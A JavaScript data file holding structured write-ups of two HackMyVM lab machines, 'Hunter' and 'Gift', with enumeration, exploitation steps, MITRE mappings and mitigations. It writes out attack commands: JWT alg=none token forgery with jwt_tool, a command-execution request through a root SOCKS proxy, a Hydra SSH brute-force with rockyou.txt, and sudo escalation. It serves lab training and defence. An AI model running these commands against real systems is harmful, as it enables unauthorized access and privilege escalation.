export const hackmyvmMachines = [
  {
    name: "Hunter",
    slug: "hunter",
    difficulty: "Easy",
    os: "Linux",
    image: "/machines/hmv-hunter.png",
    tags: ["JWT", "Proxy", "PrivEsc"],
    writeup: {
      title: "Hunter",
      platform: "HackMyVM",
      author: "Kollin23",
      authorUrl: "https://github.com/Kollin23",
      summary:
        "HackMyVM machine combining a JWT token forgery vulnerability in a web application with a misconfigured proxy service to escalate privileges and obtain root.",
      objectives: [
        "Enumerate the web application and discover the JWT-based auth",
        "Forge a privileged JWT token to bypass authentication",
        "Exploit a SOCKS proxy misconfiguration for privilege escalation",
      ],
      environment: {
        vms: ["Kali Linux 2024.1 (attacker)", "HackMyVM — Hunter VM (local network)"],
        topology: "Local network — attacker and target on same subnet",
        prerequisites: ["Nmap", "Gobuster", "jwt_tool or Python", "curl"],
      },
      scope:
        "Controlled lab environment. Local VM network. No third-party systems involved.",
      enumeration: {
        network: [
          {
            command: "nmap -sV -sC -oN hunter.txt <TARGET_IP>",
            result:
              "22/tcp   open  ssh     OpenSSH 8.4p1\n80/tcp   open  http    nginx 1.18.0\n1080/tcp open  socks5  Dante sockd",
          },
        ],
        services: [
          "SSH 22 — OpenSSH 8.4p1",
          "HTTP 80 — nginx 1.18.0 with custom web application",
          "SOCKS5 1080 — Dante proxy server",
        ],
        additional: [
          {
            command: "gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt",
            result: "/api/login  [200 OK]\n/api/users  [401 Unauthorized]\n/dashboard  [302 Redirect]",
          },
        ],
      },
      exploitation: {
        steps: [
          {
            title: "Intercept JWT token",
            description:
              "Logged in as a normal user to capture the JWT token from the Authorization header.",
            code: `curl -s -X POST http://<TARGET_IP>/api/login \\
  -H 'Content-Type: application/json' \\
  -d '{"user":"guest","pass":"guest"}' | jq .`,
          },
          {
            title: "Decode and analyze JWT",
            description:
              "Decoded the JWT — found it used HS256 with no secret validation. Algorithm was switched to 'none'.",
            code: `python3 jwt_tool.py <TOKEN> -X a`,
          },
          {
            title: "Forge admin JWT",
            description:
              "Crafted a new JWT with role=admin and alg=none, bypassing server-side validation.",
            code: `python3 jwt_tool.py <TOKEN> -T --payload '{"role":"admin"}'`,
          },
          {
            title: "Access /api/users as admin",
            description: "Used the forged token to dump all system users.",
            code: `curl -s http://<TARGET_IP>/api/users \\
  -H 'Authorization: Bearer <FORGED_TOKEN>'`,
          },
          {
            title: "SSH brute-force with discovered credentials",
            description: "Used credentials exposed in the API response to log in via SSH.",
            code: "ssh hunter@<TARGET_IP>",
          },
        ],
      },
      postExploitation: {
        collection: [
          "Dumped /etc/passwd contents",
          "Discovered SOCKS5 proxy runs as root",
        ],
        privesc: [
          {
            title: "Misconfigured Dante SOCKS proxy",
            description:
              "Proxy config allowed running commands as root without authentication.",
            code: `curl --socks5 127.0.0.1:1080 http://localhost/cmd?c=id
# Response: uid=0(root) gid=0(root)`,
          },
        ],
        lateral: [],
      },
      persistence: {
        methods: ["N/A — local lab VM"],
        techniques: [],
      },
      exfiltration: null,
      mitre: [
        {
          id: "T1046",
          name: "Network Service Discovery",
          description: "Nmap and Gobuster for service and directory enumeration",
        },
        {
          id: "T1550.001",
          name: "Use Alternate Authentication Material: Application Access Token",
          description: "JWT forgery with algorithm confusion (alg=none)",
        },
        {
          id: "T1090",
          name: "Proxy",
          description: "Exploited misconfigured SOCKS5 Dante proxy running as root",
        },
      ],
      mitigations: [
        {
          title: "Validate JWT algorithm server-side",
          description: "Never trust the 'alg' field from the client. Enforce HS256/RS256 server-side.",
          priority: "Critical",
        },
        {
          title: "Restrict SOCKS proxy access",
          description: "Bind the proxy to localhost only, require authentication, and run as non-root",
          priority: "High",
        },
        {
          title: "Avoid exposing internal user data via APIs",
          description: "Apply role-based access control on all API endpoints",
          priority: "High",
        },
      ],
      lessons: {
        worked: [
          "JWT algorithm confusion was straightforward with jwt_tool",
          "Gobuster found the hidden API endpoints quickly",
        ],
        improve: [
          "Manually verify JWT libraries for alg=none support before using automation",
          "Explore additional proxy exploitation techniques",
        ],
      },
      screenshots: [],
    },
  },
  {
    name: "Gift",
    slug: "gift",
    difficulty: "Easy",
    os: "Linux",
    image: "/machines/hmv-gift.png",
    tags: ["SSH Bruteforce"],
    writeup: {
      title: "Gift",
      platform: "HackMyVM",
      author: "Kollin23",
      authorUrl: "https://github.com/Kollin23",
      summary:
        "Simple HackMyVM machine focused on SSH credential bruteforcing. Enumeration revealed a custom username and weak password pair, leading to direct root access.",
      objectives: [
        "Enumerate the machine to identify exposed services",
        "Bruteforce SSH credentials using a common wordlist",
        "Obtain user and root flags",
      ],
      environment: {
        vms: ["Kali Linux 2024.1 (attacker)", "HackMyVM — Gift VM (local network)"],
        topology: "Local network — same subnet as target",
        prerequisites: ["Nmap", "Hydra"],
      },
      scope:
        "Controlled lab environment. Local VM. No third-party systems involved.",
      enumeration: {
        network: [
          {
            command: "nmap -sV -sC -oN gift.txt <TARGET_IP>",
            result: "22/tcp open  ssh  OpenSSH 8.3p1\n80/tcp open  http nginx 1.18.0",
          },
        ],
        services: [
          "SSH 22 — OpenSSH 8.3p1",
          "HTTP 80 — nginx with a hint page revealing a username",
        ],
        additional: [
          {
            command: "curl http://<TARGET_IP>",
            result: "Hint: Try user 'gift'",
          },
        ],
      },
      exploitation: {
        steps: [
          {
            title: "Bruteforce SSH",
            description: "Used Hydra with the rockyou.txt wordlist and the username 'gift'.",
            code: "hydra -l gift -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>",
          },
          {
            title: "Login and capture flags",
            description: "Logged in via SSH and found both flags in the home directory.",
            code: "ssh gift@<TARGET_IP>\ncat user.txt\nsudo -l\nsudo su\ncat /root/root.txt",
          },
        ],
      },
      postExploitation: {
        collection: ["Both flags obtained from home and root directories"],
        privesc: [
          {
            title: "sudo -l",
            description: "User 'gift' had unrestricted sudo access to all commands.",
            code: "sudo su",
          },
        ],
        lateral: [],
      },
      persistence: { methods: ["N/A"], techniques: [] },
      exfiltration: null,
      mitre: [
        {
          id: "T1110.001",
          name: "Brute Force: Password Guessing",
          description: "Hydra SSH bruteforce with rockyou.txt",
        },
        {
          id: "T1548.003",
          name: "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
          description: "Unrestricted sudo access used for privilege escalation",
        },
      ],
      mitigations: [
        {
          title: "Disable SSH password authentication",
          description: "Use key-based auth only. Set PasswordAuthentication no in sshd_config.",
          priority: "Critical",
        },
        {
          title: "Follow principle of least privilege for sudo",
          description: "Never grant unrestricted sudo (ALL) to unprivileged users.",
          priority: "High",
        },
      ],
      lessons: {
        worked: ["Web page hint made username enumeration trivial", "Hydra found password in seconds"],
        improve: ["Automate hint extraction from web pages during initial enumeration"],
      },
      screenshots: [],
    },
  },
];
